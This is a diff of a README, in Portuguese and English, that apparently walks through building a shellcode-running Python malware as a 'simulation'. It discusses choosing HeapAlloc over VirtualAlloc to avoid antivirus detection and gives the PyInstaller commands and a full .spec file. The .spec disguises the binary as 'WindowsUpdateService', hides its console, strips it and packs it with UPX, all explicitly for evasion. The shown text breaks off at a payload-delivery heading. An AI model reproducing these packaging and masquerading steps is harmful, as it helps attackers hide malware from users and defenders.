@@ -53,11 +53,12 @@ comando para converter o resultado em codigo hexadecimal
 
 Agora nos temos um shellcode pronto para ser inserido no codigo 
 
-**Diferenca entre ```xml VirtualAlloc``` e ```xml HeapAlloc```**     
-    Enquanto estudava para montar este malware me deparei com duas opcoes sobre como o malware iria alocar memoria no sistema alvo 
+# Diferenca entre *VirtualAlloc e xml HeapAlloc*     
+
+   Enquanto estudava para montar este malware me deparei com duas opcoes sobre como o malware iria alocar memoria no sistema alvo 
  pelo o que eu entendi ```xml VitualAlloc``` aloca grandes blocos de memoria deixando tudo pronto para que o codigo ja seja executado,
- e muito usado por sistemas complexos entretanto deixa muito rastros no sistema (```xml xmlVirtualAlloc + WriteProcessMemory + CreateRemoteThread```)e por ja ter sido muito usada
- ja e conhecida por antivirus.
+ e muito usado por sistemas complexos entretanto deixa muito rastros no sistema (```xml xmlVirtualAlloc + WriteProcessMemory + CreateRemoteThread```)
+ e por ja ter sido muito usada ja e conhecida por antivirus.
  
  s2  ```xml HeapAlloc``` por outro lado usa um pedaco pequeno da memoria disponivel e e metodo muito usado pela maioria dos programas isso torna essa opcao 
  muito menos suspeita o ponto negativo e que o pedaco de memoria alocado inicialmente nao pode executar o codigo entao e necessario a execucao de outro comando depois ```xml HEAP_CREATE_ENABLE_EXECUTE```
@@ -121,17 +122,86 @@ ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
     
 ## 🧪 GERANDO UM EXCUTAVEL
 
-Apos ter configurado o codigo foi usado este comando para gerar o executavel 
+Apos ter configurado o codigo foi usado este comando para gerar o executavel usando wine no kali linux
 
-```pyinstaller --noconfirm --onefile malwareobfuscated.py```
+```bash
+wine cmd
+pyinstaller --noconfirm --onefile malwareobfuscated.py
+```
 
-Entretando nos adicionamos mais um degrau de obfuscacao editando o arquivo .spec, o objetivo e parecer ao maximo um programa normal
+Entretando nos adicionamos mais um degrau de obfuscacao editando o arquivo .spec, com o objetivo de parecer ao maximo um programa normal
 do windows. 
 
+**.SPEC FILE** 
 
-[.SPEC PRINT]
+```bash
+# -*- mode: python ; coding: utf-8 -*-
+
+block_cipher = None
+
+a = Analysis(
+    ['malwareobfuscated.py'],
+    pathex=['.'],
+    binaries=[],
+    datas=[],
+    hiddenimports=[],
+    hookspath=[],
+    hooksconfig={},
+    runtime_hooks=[],
+    excludes=[],
+    noarchive=False,
+    optimize=2,  # enable bytecode optimization
+)
+
+pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
+
+exe = EXE(
+    pyz,
+    a.scripts,
+    [],
+    exclude_binaries=True,
+    name='WindowsUpdateService',  # process name — mimics a legitimate system service
+    debug=False,
+    bootloader_ignore_signals=False,
+    strip=True,  # strip debug symbols from executable
+    upx=True,  # apply UPX compression to reduce file size
+    upx_exclude=[],
+    runtime_tmpdir=None,
+    console=False,  # hide console window 
+    disable_windowed_traceback=True,  # disable error pop-ups on crash
+    argv_emulation=False,
+    target_arch=None,
+    codesign_identity=None,
+    entitlements_file=None,
+)
+
+coll = COLLECT(
+    exe,
+    a.binaries,
+    a.zipfiles,
+    a.datas,
+    strip=True,
+    upx=True,
+    name='WindowsUpdateService'
+)
+
+```
+This build configuration utilizes the PyInstaller .spec file (resulted from the last command)  to generate a standalone Windows executable that mimics a legitimate system process.
+The output binary is named WindowsUpdateService.exe, leveraging process masquerading as an evasion technique. The executable is stripped of debug symbols, compressed using UPX, and runs silently without a console window, 
+reducing forensic visibility. No external dependencies are bundled, keeping the footprint minimal. 
+
+After configure the .spec file we generate the final executable:
+
+```bash
+wine cmd
+pyinstaller malwareobfuscated.spec
+```
+
+[ PRINT OF CREATED MALWARE]
 
 
+
+##DELIVERING THE PAYLOAD 
 
 1. **Objetivo da simulação**
 2. **Comando executado pelo atacante**
